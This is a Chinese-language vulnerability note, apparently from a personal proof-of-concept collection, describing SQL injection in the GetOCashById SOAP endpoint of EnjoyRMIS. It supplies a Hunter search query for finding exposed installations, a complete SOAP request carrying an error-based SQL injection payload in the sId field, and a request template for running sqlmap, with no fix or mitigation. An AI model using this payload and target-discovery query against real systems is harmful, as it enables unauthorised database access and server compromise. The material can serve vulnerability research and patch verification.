# EnjoyRMIS GetOCashById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS GetOCashById存在SQL注入漏洞,攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征

![1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89.png](./img/vYTtwPaoO6SfICoc/1700576375104-73ed7b01-1186-48d1-a163-ef4068a88d89-467876.png)

# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCashById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCashById xmlns="http://tempuri.org/">
      <sId>string' AND 2187 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (2187=2187) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(118)+CHAR(113))) AND 'uXof'='uXof</sId>
    </GetOCashById>
  </soap:Body>
</soap:Envelope>
```

![1700644453166-5bba5c8c-2b5d-4e26-b6b6-2d7a657b2f5c.png](./img/vYTtwPaoO6SfICoc/1700644453166-5bba5c8c-2b5d-4e26-b6b6-2d7a657b2f5c-009235.png)

sqlmap

```plain
POST /EnjoyRMIS_WS/WS/POS/cwsoa.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOCashById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOCashById xmlns="http://tempuri.org/">
      <sId>string</sId>
    </GetOCashById>
  </soap:Body>
</soap:Envelope>
```

![1700644483934-6e89b9f0-7ece-400a-81b5-b7092b2fae79.png](./img/vYTtwPaoO6SfICoc/1700644483934-6e89b9f0-7ece-400a-81b5-b7092b2fae79-412026.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/uggmgqbtlqn12ek2>